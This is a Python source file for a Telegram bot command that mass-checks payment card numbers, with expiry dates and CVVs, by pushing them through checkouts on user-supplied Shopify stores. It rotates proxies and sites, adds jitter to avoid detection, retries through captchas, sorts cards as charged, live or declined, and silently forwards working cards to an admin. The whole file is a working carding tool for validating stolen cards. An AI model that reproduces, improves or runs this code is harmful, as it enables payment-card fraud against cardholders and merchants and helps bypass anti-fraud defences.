"""
TXT Sites Shopify Checker with Site Rotation
Handles /tsh command: parallel mode (33 threads), rate limiting, 429-safe with adaptive throttling.
Professional Parallel Processing - 33 concurrent threads, Railway-optimized, 50 card limit.
Stop button: mandatory — only the user who started the check can stop it.
Early termination: first real response wins, stops all other processing for that card.
"""

import os
import re
import json
import asyncio
import time
import random
from collections import deque
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode
from BOT.Charge.Shopify.slf.api import autoshopify, autoshopify_with_captcha_retry
from BOT.Charge.Shopify.tls_session import TLSAsyncSession
from BOT.Charge.Shopify.bulletproof_session import BulletproofSession
from BOT.Charge.Shopify.slf.site_manager import SiteRotator, get_user_sites
from BOT.Charge.Shopify.slf.single import check_card_all_sites_parallel
from BOT.helper.permissions import check_private_access
from BOT.tools.proxy import get_rotating_proxy
from BOT.helper.start import load_users
from BOT.helper.safe_edit import safe_edit_with_throttle
from BOT.helper.admin_forward import forward_success_card_to_admin
from BOT.helper.error_files import clear_error_file, save_error_ccs, generate_check_id, get_error_file_path

SPINNERS = ("◐", "◓", "◑", "◒")
tsh_stop_requested: dict[str, bool] = {}

# --- Adaptive Rate Limiter Class ---

class RateLimitedChecker:
    def __init__(self, concurrency=33, requests_per_second=25):
        """Professional parallel processing - 33 threads with throttle, Railway-optimized rate limiting."""
        self.sem = asyncio.Semaphore(concurrency)
        self.requests_per_second = requests_per_second  # Railway-safe rate limit
        self.request_times = deque()
        self.lock = asyncio.Lock()
        self.consecutive_429s = 0
        self.current_delay = 0.08  # Railway-safe initial delay for 33 threads
        # Card result tracking: first real response wins
        self.card_results = {}  # {card: (result, retries)} - tracks completed cards
        self.card_locks = {}  # {card: asyncio.Lock()} - prevents duplicate processing
    
    async def wait_for_rate_limit(self):
        """Token bucket enforcement - optimized for speed"""
        async with self.lock:
            now = time.monotonic()
            # Clean old entries
            while self.request_times and now - self.request_times[0] > 1.0:
                self.request_times.popleft()
            # Enforce rate limit
            if len(self.request_times) >= self.requests_per_second:
                sleep_time = 1.0 - (now - self.request_times[0])
                if sleep_time > 0: 
                    await asyncio.sleep(sleep_time)
            self.request_times.append(time.monotonic())

    async def adaptive_delay(self):
        """Dynamic sleep - Railway-safe with professional delays"""
        jitter = random.uniform(0.02, 0.08)  # Railway-safe jitter to avoid detection
        await asyncio.sleep(self.current_delay + jitter)
    
    def on_success(self):
        self.consecutive_429s = 0
        self.current_delay = max(0.05, self.current_delay * 0.95)  # Gradual speed up (Railway-safe)
    
    def on_429(self):
        self.consecutive_429s += 1
        self.current_delay = min(2.5, self.current_delay * 1.5)  # Moderate slowdown (Railway-safe)

    async def safe_check(self, user_id, card):
        """
        Professional card check with:
        - Site rotation with retries
        - Proxy rotation per request
        - Captcha bypass logic
        - Silver bullet speed
        - Early termination on first real response
        """
        # Check if this card already has a real response (early termination)
        if card in self.card_results:
            return card, self.card_results[card][0], self.card_results[card][1]
        
        # Get or create lock for this card
        if card not in self.card_locks:
            self.card_locks[card] = asyncio.Lock()
        
        async with self.card_locks[card]:
            # Double-check after acquiring lock (another thread might have completed it)
            if card in self.card_results:
                return card, self.card_results[card][0], self.card_results[card][1]
            
            async with self.sem:
                try:
                    await self.wait_for_rate_limit()
                    await self.adaptive_delay()
                    
                    # Get fresh proxy for this request (rotation)
                    proxy = get_rotating_proxy(user_id)
                    
                    # Get ALL user sites for rotation
                    sites = get_user_sites(user_id)
                    if not sites:
                        result = {"Response": "NO_SITES", "Status": False}
                        self.card_results[card] = (result, 0)
                        return card, result, 0
                    
                    # Filter active sites - use all saved sites
                    active_sites = [s for s in sites if s.get("active", True)]
                    if not active_sites:
                        result = {"Response": "NO_ACTIVE_SITES", "Status": False}
                        self.card_results[card] = (result, 0)
                        return card, result, 0
                    
                    # Site rotation with retries - use all saved sites properly
                    rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
                    retry_count = 0
                    last_response = "UNKNOWN"
                    last_result = None
                    
                    while retry_count < MAX_SITE_RETRIES:
                        # Check again if card was completed by another thread
                        if card in self.card_results:
                            return card, self.card_results[card][0], self.card_results[card][1]
                        
                        current_site = rotator.get_current_site()
                        if not current_site:
                            break
                        
                        site_url = current_site.get("url")
                        
                        try:
                            # Rotate proxy for each retry attempt
                            if retry_count > 0:
                                proxy = get_rotating_proxy(user_id)
                            
                            # Professional check with bulletproof session
                            async with BulletproofSession(timeout_seconds=60, proxy=proxy, use_playwright=False) as session:
                                # Use captcha-aware wrapper with 3 internal retries
                                result = await autoshopify_with_captcha_retry(
                                    site_url, 
                                    card, 
                                    session, 
                                    max_captcha_retries=3,
                                    proxy=proxy
                                )
                            
                            response = str(result.get("Response", "UNKNOWN"))
                            last_response = response
                            last_result = result
                            
                            # Check if this is a real response - FIRST REAL RESPONSE WINS
                            if rotator.is_real_response(response):
                                rotator.mark_current_success()
                                # Store result and stop processing this card
                                self.card_results[card] = (result, retry_count)
                                # Analyze for rate limiting
                                resp_str = response.upper()
                                if "429" in resp_str or "RATE LIMIT" in resp_str:
                                    self.on_429()
                                else:
                                    self.on_success()
                                return card, result, retry_count
                            
                            # Check if we should retry with another site
                            if rotator.should_retry(response) and retry_count < MAX_SITE_RETRIES - 1:
                                retry_count += 1
                                rotator.mark_current_failed()
                                next_site = rotator.get_next_site()
                                if not next_site:
                                    break
                                # Railway-safe delay between site rotations
                                await asyncio.sleep(0.15)
                                continue
                            else:
                                # Not a retry case - store and return
                                if not rotator.is_real_response(response):
                                    self.card_results[card] = (result, retry_count)
                                # Analyze for rate limiting
                                resp_str = response.upper()
                                if "429" in resp_str or "RATE LIMIT" in resp_str:
                                    self.on_429()
                                else:
                                    self.on_success()
                                return card, result, retry_count
                                
                        except Exception as e:
                            last_response = f"ERROR: {str(e)[:30]}"
                            retry_count += 1
                            next_site = rotator.get_next_site()
                            if not next_site:
                                break
                            await asyncio.sleep(0.15)
                    
                    # All retries exhausted
                    if last_result:
                        resp_str = str(last_result.get("Response", "")).upper()
                        if "429" in resp_str or "RATE LIMIT" in resp_str:
                            self.on_429()
                        else:
                            self.on_success()
                        self.card_results[card] = (last_result, retry_count)
                        return card, last_result, retry_count
                    
                    final_result = {"Response": last_response, "Status": False}
                    self.card_results[card] = (final_result, retry_count)
                    return card, final_result, retry_count
                    
                except Exception as e:
                    error_result = {"Response": f"ERROR: {e}", "Status": False}
                    self.card_results[card] = (error_result, 0)
                    return card, error_result, 0

# Try to import BIN lookup
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return None

MAX_SITE_RETRIES = 3


def _log_check_to_terminal_tsh(gate: str, res: dict, fullcc: str) -> None:
    """Print one check result to terminal (Gateway, Price, ReceiptId, Response, Status, cc) - for tsh checks."""
    r = res or {}
    gate_raw = r.get("Gateway") or gate or "Unknown"
    gate_display = "Shopify Normal" if (not gate_raw or gate_raw == "Unknown" or gate_raw == "Normal") else (gate_raw if "Shopify" in str(gate_raw) else f"Shopify {gate_raw}")
    if "$" in str(gate_display):
        gate_display = re.sub(r"\s*\$\s*[\d.]+\s*$", "", str(gate_display)).strip() or "Shopify Normal"
    price = r.get("Price", "0.00")
    rid = r.get("ReceiptId")
    resp = r.get("Response", "UNKNOWN")
    status = r.get("Status", False)
    cc = r.get("cc", fullcc)
    lines = [f"Gateway: {gate_display}", f"Price: {price}"]
    if rid:
        lines.append(f"ReceiptId: {rid}")
    lines.append(f"Response: {resp} Status: {str(status).lower()}")
    if cc:
        lines.append(f"cc: {cc}")
    print("\n".join(lines))
    print()


def extract_cards_from_text(text: str):
    """Extract cards from text in various formats."""
    # Standard format: cc|mm|yy|cvv
    pattern1 = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    found = re.findall(pattern1, text)
    
    if found:
        cleaned = []
        for card in found:
            cc, mm, yy, cvv = card
            mm = mm.zfill(2)
            if len(yy) == 2:
                yy = "20" + yy
            cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")
        return list(dict.fromkeys(cleaned))
    
    # Alternative format with various separators
    pattern2 = r'(\d{13,16})[^0-9]*(\d{1,2})[^0-9]*(\d{2,4})[^0-9]*(\d{3,4})'
    found = re.findall(pattern2, text)
    cleaned = []

    for card in found:
        cc, mm, yy, cvv = card
        mm = mm.zfill(2)
        if len(yy) == 2:
            yy = "20" + yy
        cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")

    return list(dict.fromkeys(cleaned))


def get_status_flag(raw_response: str) -> str:
    """Determine proper status flag from response."""
    response_upper = str(raw_response).upper() if raw_response else ""
    
    # Errors first - Site/System issues
    if any(x in response_upper for x in [
        # Captcha/Bot detection
        "CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE", "VERIFY",
        # Site errors
        "SITE_EMPTY", "SITE_HTML", "SITE_CAPTCHA", "SITE_HTTP", "SITE_CONNECTION",
        "SITE_NO_PRODUCTS", "SITE_PRODUCTS_EMPTY", "SITE_INVALID_JSON", "SITE_EMPTY_JSON",
        # Cart/Session errors
        "CART_ERROR", "CART_HTML", "CART_INVALID", "CART_CREATION",
        "SESSION_ERROR", "SESSION_ID", "SESSION_INVALID",
        # Other system errors
        "CONNECTION", "RATE LIMIT", "PRODUCT ID", "SITE NOT FOUND",
        "TIMEOUT", "FAILED", "ERROR", "BLOCKED", "PROXY", "DEAD", "EMPTY",
        "NO_AVAILABLE_PRODUCTS", "BUILD", "TAX", "DELIVERY"
    ]):
        return "Error ⚠️"
    
    # Charged
    if any(x in response_upper for x in [
        "ORDER_PLACED", "THANK YOU", "SUCCESS", "CHARGED", "COMPLETE"
    ]):
        return "Charged 💎"
    
    # CCN/Live
    if any(x in response_upper for x in [
        "3DS", "3D_SECURE", "AUTHENTICATION_REQUIRED",
        "INCORRECT_CVC", "INVALID_CVC", "CVV_MISMATCH",
        "INSUFFICIENT_FUNDS", "INCORRECT_ZIP", "INCORRECT_ADDRESS",
        "MISMATCHED", "INCORRECT_PIN"
    ]):
        return "Approved ✅"
    
    # Declined
    if any(x in response_upper for x in [
        "CARD_DECLINED", "DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR",
        "INVALID_ACCOUNT", "EXPIRED", "CARD_NOT_SUPPORTED", "TRY_AGAIN",
        "PROCESSING_ERROR", "PICKUP", "LOST", "STOLEN", "FRAUD",
        "RESTRICTED", "REVOKED", "INVALID_NUMBER", "NO_SUCH_CARD"
    ]):
        return "Declined ❌"
    
    return "Declined ❌"

async def check_card_with_rotation(user_id: str, card: str, proxy: str = None) -> tuple:
    """
    Check a card with site rotation on captcha/errors.
    Returns (response, retries, site_url)
    """
    rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
    
    if not rotator.has_sites():
        return "NO_SITES_CONFIGURED", 0, None
    
    retry_count = 0
    last_response = "UNKNOWN"
    last_site = None
    
    while retry_count < MAX_SITE_RETRIES:
        current_site = rotator.get_current_site()
        if not current_site:
            break
        
        site_url = current_site.get("url")
        last_site = site_url
        
        try:
            async with TLSAsyncSession(timeout_seconds=75, proxy=proxy) as session:
                # Use captcha-aware wrapper with 3 internal retries
                result = await autoshopify_with_captcha_retry(site_url, card, session, max_captcha_retries=3)
            
            response = str(result.get("Response", "UNKNOWN"))
            last_response = response
            
            # Check if this is a real response
            if rotator.is_real_response(response):
                rotator.mark_current_success()
                return response, retry_count, site_url
            
            # Check if we should retry
            if rotator.should_retry(response):
                retry_count += 1
                rotator.mark_current_failed()
                next_site = rotator.get_next_site()
                if not next_site:
                    break
                await asyncio.sleep(0.15)
                continue
            else:
                return response, retry_count, site_url
                
        except Exception as e:
            last_response = f"ERROR: {str(e)[:30]}"
            retry_count += 1
            next_site = rotator.get_next_site()
            if not next_site:
                break
    
    return last_response, retry_count, last_site


@Client.on_message(filters.command("tsh") & filters.reply)
async def tsh_handler(client: Client, m: Message):
    """Handle /tsh command for TXT sites checking with site rotation."""
    
    users = load_users()
    user_id = str(m.from_user.id)
    
    if user_id not in users:
        return await m.reply(
            """<pre>Access Denied 🚫</pre>
<b>You must register first using</b> <code>/register</code> <b>command.</b>""",
            parse_mode=ParseMode.HTML
        )
    
    # Get cards from reply
    cards = []
    
    if m.reply_to_message.document:
        file_path = await m.reply_to_message.download()
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
            cards = extract_cards_from_text(text)
        finally:
            try:
                if file_path and os.path.isfile(file_path):
                    os.remove(file_path)
            except Exception:
                pass
    elif m.reply_to_message.text:
        cards = extract_cards_from_text(m.reply_to_message.text)
    
    if not cards:
        return await m.reply(
            "<pre>No Cards Found ❌</pre>\n<b>Reply to a file or message containing cards.</b>",
            parse_mode=ParseMode.HTML
        )

    total_cards = len(cards)
    
    # Check user plan for VIP unlimited access
    user_data = users.get(user_id, {})
    plan_info = user_data.get("plan", {})
    plan = plan_info.get("plan", "Free")
    is_vip = plan == "VIP"
    
    # VIP has unlimited, other plans check mlimit
    if not is_vip:
        mlimit = plan_info.get("mlimit")
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10_000
        else:
            mlimit = int(mlimit)
        
        if total_cards > mlimit:
            return await m.reply(
                f"<pre>Card Limit Exceeded ❌</pre>\n"
                f"<b>Your plan allows max</b> <code>{mlimit}</code> <b>cards.</b>\n"
                f"<b>You provided:</b> <code>{total_cards}</code> <b>cards.</b>\n"
                f"<b>Upgrade to VIP for unlimited mass checking!</b>",
                parse_mode=ParseMode.HTML
            )

    user = m.from_user
    user_sites = get_user_sites(user_id)

    if not user_sites:
        return await m.reply(
            "<pre>No Sites Found ❌</pre>\n<b>Use <code>/addurl</code> or <code>/txturl</code> to add sites.</b>",
            parse_mode=ParseMode.HTML
        )

    proxy = get_rotating_proxy(int(user_id))
    
    # Check if proxy is configured
    if not proxy:
        return await m.reply(
            """<pre>Proxy Required 🔐</pre>
━━━━━━━━━━━━━━━
<b>You haven't configured a proxy yet.</b>

<b>Proxy is required for:</b>
• Avoiding rate limits
• Better success rates
• Secure checking

<b>How to set up:</b>
<code>/setpx ip:port:user:pass</code>

<b>Example:</b>
<code>/setpx 192.168.1.1:8080:user:pass</code>
━━━━━━━━━━━━━━━
<i>Set your proxy in private chat first!</i>""",
            parse_mode=ParseMode.HTML
        )
    
    site_count = len(user_sites)
    gateway = user_sites[0].get("gateway", "Shopify") if user_sites else "Shopify"

    tsh_stop_requested[user_id] = False
    had_previous = get_error_file_path(user_id, "shopify") is not None
    clear_error_file(user_id, "shopify")
    check_id = generate_check_id()
    error_ccs = []  # error + captcha CCs for /geterrors tsh (shared shopify gate; cleared on next check)
    cleaning_note = "\n<b>📎 Previous error file cleared.</b>" if had_previous else ""
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹ Stop Checking", callback_data=f"tsh_stop_{user_id}")],
    ])

    # Send preparing message with loading spinner and stop button (check_id only in processing + completion)
    status_msg = await m.reply(
        f"""<pre>◐ [#TSH] | TXT Shopify Check</pre>
━━━━━━━━━━━━━
<b>[⚬] Check ID:</b> <code>{check_id}</code>
<b>⊙ Total CC:</b> <code>{total_cards}</code>
<b>⊙ Sites:</b> <code>{site_count}</code> · <b>Mode:</b> <code>Parallel (33 threads) ⚡</code>
<b>⊙ Status:</b> <code>◐ Preparing...</code>{cleaning_note}
━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {user.mention}""",
        parse_mode=ParseMode.HTML,
        reply_markup=stop_kb,
    )

    start_time = time.time()
    last_progress_edit = 0.0
    PROGRESS_THROTTLE = 0.25  # Faster updates for responsive UI
    checked_count = 0
    charged_count = 0
    approved_count = 0
    declined_count = 0
    error_count = 0
    captcha_count = 0
    total_retries = 0
    stopped = False

    async def _edit_progress(force: bool = False):
        nonlocal last_progress_edit
        now = time.time()
        if not force and (now - last_progress_edit) < PROGRESS_THROTTLE:
            return
        elapsed = now - start_time
        rate = (checked_count / elapsed) if elapsed > 0 else 0
        sp = SPINNERS[checked_count % 4]
        progress_text = f"""<pre>{sp} [#TSH] | TXT Shopify Check</pre>
━━━━━━━━━━━━━━━
<b>[⚬] Check ID:</b> <code>{check_id}</code>
<b>🟢 Total CC:</b> <code>{total_cards}</code>
<b>💬 Progress:</b> <code>{checked_count}/{total_cards}</code>
<b>✅ Approved:</b> <code>{approved_count}</code>
<b>💎 Charged:</b> <code>{charged_count}</code>
<b>❌ Declined:</b> <code>{declined_count}</code>
<b>⚠️ Errors:</b> <code>{error_count}</code>
<b>🔄 Rotations:</b> <code>{total_retries}</code>
<b>⏱️ Time:</b> <code>{elapsed:.1f}s</code> · <code>{rate:.1f} cc/s</code>
<b>⚡ Threads:</b> <code>100</code>
<b>[ﾒ] By:</b> {user.mention}"""
        
        success, new_time = await safe_edit_with_throttle(
            client=client,
            message=status_msg,
            text=progress_text,
            last_edit_time=last_progress_edit,
            throttle_seconds=PROGRESS_THROTTLE,
            reply_markup=stop_kb,
            parse_mode=ParseMode.HTML,
            force=force
        )
        if success:
            last_progress_edit = new_time

    # Initialize Checker with 33 threads - Professional Multi-threading Throttle (Railway-optimized)
    checker = RateLimitedChecker(concurrency=33, requests_per_second=25)

    # Create Tasks
    tasks = [checker.safe_check(user_id, card) for card in cards]
    
    for task_coro in asyncio.as_completed(tasks):
        if tsh_stop_requested.get(user_id):
            stopped = True
            break
        
        try:
            o = await task_coro
        except Exception as e:
            o = (card, f"ERROR: {str(e)[:40]}", 0, None)
        
        # Unpack result from safe_check
        # safe_check returns: card, result, retries
        # But wait - check_card_all_sites_parallel returns (result, retries)
        # So safe_check actually returns: card, result_dict, retries
        
        card_used, result, retries = o
        
        # Backward compatibility for extraction logic below
        raw_response = str((result or {}).get("Response", "UNKNOWN"))
        
        checked_count += 1
        total_retries += retries

        # Log ALL responses to terminal (same format as /sh)
        if result:
            result["cc"] = card_used
            _log_check_to_terminal_tsh("Shopify", result, card_used)
        else:
            # Create minimal result dict for logging
            log_result = {
                "Response": raw_response,
                "Status": False,
                "Gateway": "Shopify",
                "Price": "0.00",
                "cc": card_used
            }
            _log_check_to_terminal_tsh("Shopify", log_result, card_used)

        try:
            response_upper = raw_response.upper()
            status_flag = get_status_flag(response_upper)
            is_charged = "Charged 💎" in status_flag
            is_approved = "Approved ✅" in status_flag
            is_error = "Error ⚠️" in status_flag
            is_captcha = any(x in response_upper for x in ["CAPTCHA", "HCAPTCHA", "RECAPTCHA"])
            if is_charged:
                charged_count += 1
            elif is_approved:
                approved_count += 1
            elif is_error:
                error_count += 1
                error_ccs.append(card_used)
            else:
                declined_count += 1
            if is_captcha:
                captcha_count += 1
                if card_used not in error_ccs:
                    error_ccs.append(card_used)
            
            if is_charged or is_approved:
                cc = card_used.split("|")[0] if "|" in card_used else card_used
                try:
                    bin_data = get_bin_details(cc[:6])
                    if bin_data:
                        bin_info = f"{bin_data.get('vendor', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('level', 'N/A')}"
                        bank = bin_data.get('bank', 'N/A')
                        country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '')}"
                    else:
                        bin_info = bank = country = "N/A"
                except Exception:
                    bin_info = bank = country = "N/A"
                pr = (result or {}).get("Price", "0.00")
                try:
                    pv = float(pr)
                    pr = f"{pv:.2f}" if pv != int(pv) else str(int(pv))
                except:
                    pr = "0.00"
                gateway_display = f"Shopify Normal ${pr}"
                hit_header = "CHARGED" if is_charged else "CCN LIVE"
                hit_message = f"""<b>[#Shopify] | {hit_header}</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card:</b> <code>{card_used}</code>
<b>[•] Gateway:</b> <code>{gateway_display}</code>
<b>[•] Status:</b> <code>{status_flag}</code>
<b>[•] Response:</b> <code>{raw_response}</code>
<b>[•] Retries:</b> <code>{retries}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] BIN:</b> <code>{cc[:6]}</code>
<b>[+] Info:</b> <code>{bin_info}</code>
<b>[+] Bank:</b> <code>{bank}</code> 🏦
<b>[+] Country:</b> <code>{country}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user.mention}
<b>[ϟ] Dev:</b> <a href="https://t.me/Chr1shtopher">Chr1shtopher</a>
━━━━━━━━━━━━━━━"""
                try:
                    await m.reply(hit_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                except Exception:
                    pass
                
                # Forward success card to admin silently
                receipt_id = (result or {}).get("ReceiptId")
                await forward_success_card_to_admin(
                    client=client,
                    card_data=card_used,
                    status=status_flag,
                    response=raw_response,
                    gateway=gateway_display,
                    price=pr,
                    checked_by=user.mention,
                    bin_info=bin_info,
                    bank=bank,
                    country=country,
                    retries=retries,
                    receipt_id=receipt_id,
                    time_taken=0.0
                )
                
                await _edit_progress(force=True)
            
            is_last = checked_count == total_cards
            await _edit_progress(force=is_last)

        except Exception as e:
            error_count += 1

    # End of parallel loop

    total_time = time.time() - start_time
    current_time = datetime.now().strftime("%I:%M %p")
    if error_ccs:
        save_error_ccs(user_id, "shopify", error_ccs, check_id=check_id)
    error_files_line = ""
    if error_ccs:
        error_files_line = (
            f"\n📎 <b>To get error CCs file:</b> <code>/geterrors tsh</code> (Check ID: <code>{check_id}</code>)\n"
            "<b>📎 Error file stays</b> until you start a new <code>/msh</code> or <code>/tsh</code> check; then it is cleared.\n"
        )

    header = "<pre>⏹ Stopped by user</pre>" if stopped else "<pre>✓ CC Check Completed</pre>"
    summary_text = f"""{header}
━━━━━━━━━━━━━━━
<b>[⚬] Check ID:</b> <code>{check_id}</code>
🟢 <b>Total CC</b>     : <code>{total_cards}</code>
💬 <b>Progress</b>    : <code>{checked_count}/{total_cards}</code>
✅ <b>Approved</b>    : <code>{approved_count}</code>
💎 <b>Charged</b>     : <code>{charged_count}</code>
❌ <b>Declined</b>    : <code>{declined_count}</code>
⚠️ <b>Errors</b>      : <code>{error_count}</code>
⚠️ <b>CAPTCHA</b>     : <code>{captcha_count}</code>
🔄 <b>Rotations</b>   : <code>{total_retries}</code>
━━━━━━━━━━━━━━━
⏱️ <b>Time</b> : <code>{total_time:.1f}s</code> · <code>{((checked_count / total_time) if total_time > 0 else 0):.1f} cc/s</code>
👤 <b>Checked By</b> : {user.mention}
🔧 <b>Dev</b>: <a href="https://t.me/Chr1shtopher">Chr1shtopher</a> <code>{current_time}</code>
{error_files_line}━━━━━━━━━━━━━"""

    try:
        await status_msg.edit_text(
            summary_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=None,
        )
    except Exception:
        pass


@Client.on_callback_query(filters.regex(r"^tsh_stop_(\d+)$"))
async def tsh_stop_callback(client: Client, cq):
    """Stop a running /tsh check. Only the user who started it can stop."""
    try:
        if not cq.from_user:
            await cq.answer("Invalid request.", show_alert=True)
            return
        uid = cq.matches[0].group(1) if cq.matches else None
        if not uid or str(cq.from_user.id) != uid:
            await cq.answer("You can only stop your own check.", show_alert=True)
            return
        tsh_stop_requested[uid] = True
        try:
            await cq.message.edit_text(
                "<pre>⏹ Stopping... Please wait.</pre>\n\n"
                "━━━━━━━━━━━━━━━\n"
                "The check will stop after the current card finishes.",
                parse_mode=ParseMode.HTML,
                reply_markup=None,
            )
        except Exception:
            pass
        await cq.answer("Stop requested. Stopping after current card…")
    except Exception:
        await cq.answer("Could not process.", show_alert=True)
